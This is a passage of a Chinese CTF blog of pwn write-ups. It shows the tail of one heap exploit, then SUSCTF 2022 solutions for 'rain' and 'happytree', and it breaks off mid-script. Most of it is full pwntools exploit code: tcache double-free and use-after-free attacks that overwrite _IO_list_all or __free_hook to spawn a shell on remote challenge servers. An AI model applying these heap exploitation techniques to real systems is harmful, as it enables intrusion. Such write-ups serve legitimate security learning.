class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(libc_base+<span class="number">0x3e8360</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="comment"># pay = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2+1)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*12</span></span><br><span class="line">    <span class="comment"># pay+= p64(2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(3)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0xffffffff)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.address+0x3e8360)</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    edit(<span class="number">19</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/SUSCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/02/SUSCTF/" class="post-title-link" itemprop="url">SUSCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-02 15:16:21 / 修改时间：15:16:38" itemprop="dateCreated datePublished" datetime="2022-03-02T15:16:21+08:00">2022-03-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SUSCTF-PWN"><a href="#SUSCTF-PWN" class="headerlink" title="SUSCTF  PWN"></a>SUSCTF  PWN</h1><h2 id="rain"><a href="#rain" class="headerlink" title="rain"></a>rain</h2><p>程序代码量比较大，看懂程序的逻辑就浪费了一些时间，然后我眼睛瞎了那么大的漏洞我都没看见</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v7 = <span class="built_in">realloc</span>(*((<span class="keyword">void</span> **)a1 + <span class="number">7</span>), v6 - <span class="number">18</span>);</span><br></pre></td></tr></table></figure>

<p>我第一次把v7看成了a[7]，后面反复看代码的时候也没有注意这个，导致我一直没找见漏洞，在ayoung佬的提示下才发现，眼睛真的瞎了，然后在他的提示下发现远程版本的libc库还没有tcache保护，导致可以直接doublefree</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.rain的远程版本是libc2.7.so_1.2的，这个版本的tcache是没有key字段的，然后这个版本的io——list_all也是攻击的的，key字段的引入在libc2.27_1.3</span><br><span class="line">2.了解到unsortedbin的具体失效版本是libc2.29</span><br></pre></td></tr></table></figure>

<p>然后rain以后a[7]会清零，相当于拥有多个指针的ufa,直接利用，唯一麻烦的是指定运行库以后运行rain程序会退出，当时自己盲打了一会，ayoung佬给了我patch掉rain的程序，死高一，我都快忘了这个东西了。</p>
<p>结合上面的漏洞就是普通的tcache的ufa,可以修改任一地址，我修改的io_list_all指向堆，然后堆布置，这是完整代码.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&#x27;, &#x27;./ttt&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&quot;124.71.185.75&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">ogg=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">config</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;FRAME&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span>():</span></span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x150</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x60</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rain</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>,timeout=<span class="number">6000</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x0000000000401694&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        m()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xe0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Table:            &#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    <span class="comment"># payload=p32(0x100)+p32(0x100)+&#x27;\x02&#x27;+&#x27;\x01&#x27;</span></span><br><span class="line">    <span class="comment"># payload+=p32(300)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(18,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+libc.sym[&#x27;__malloc_hook&#x27;]+0x10+96)*2</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0x50+18,&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment"># config(payload)</span></span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xe0</span>+<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    payload=p32(<span class="number">20</span>)+p32(<span class="number">20</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Table:            &quot;</span>)</span><br><span class="line">    heap_addr = u64(sh.recv(<span class="number">4</span>)+<span class="string">&quot;\x00&quot;</span>*<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    rain()</span><br><span class="line">    libc.address=libc_base</span><br><span class="line">    pay=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    pay+=p32(<span class="number">4</span>)</span><br><span class="line">    pay=pay.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">    pay+= p64(<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">3</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">    pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    pay=pay.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(pay)</span><br><span class="line">    rain()</span><br><span class="line">    payload=p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>)+<span class="string">&#x27;\x02&#x27;</span>+<span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    payload+=p32(<span class="number">4</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">18</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(heap_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#SUSCTF&#123;S0_Beautiful_Rain_adasda&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>首先远程很玄学，其次堆的地址的长度其实不是固定的，我的虚拟机上是6个字节，导致我以为远程也是6个字节，然后一直接收错误，麻了。</p>
<h2 id="happytree"><a href="#happytree" class="headerlink" title="happytree"></a>happytree</h2><p>感觉漏洞不是很容易察觉，就是在有一个子节点的节点被删除时指向子节点的地址不会被删除，也就是多个指针指向同一个堆块（大忌），利用这一点可以直接doublefree，但是doublefree也不是随便就能搞的，在操作中很容易造成树变成循环树了，在删除节点时直接报错。然后暴露libc地址的时候也是利用malloc申请bins上的节点时不会清除fd和bk，所以从unsorted上申请到的堆的bk上就有libc地址（也可以利用这一点得知heap地址，但对此题无益）,至于怎么填满tcache把堆放置到unsorted上，也是利用程序申请节点时的整数溢出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&#x27;124.71.147.225&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_tree</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_tree</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_tree</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add_tree(<span class="number">0xf0</span>+i*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_tree(<span class="number">0xf0</span>+(<span class="number">7</span>-i)*<span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add_tree(<span class="number">0xf0</span>+i*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show_tree(<span class="number">0xf0</span>+<span class="number">7</span>*<span class="number">0x100</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    add_tree(<span class="number">0xf0</span>+<span class="number">8</span>*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xf0</span>+<span class="number">9</span>*<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xa0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xc0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xb0</span>)</span><br><span class="line">    add_tree(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0x40</span>)</span><br><span class="line">    add_tree(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xc0</span>)</span><br><span class="line">    del_tree(<span class="number">0</span>)</span><br><span class="line">    add_tree(<span class="number">0x1c0</span>,p64(free_hook))</span><br><span 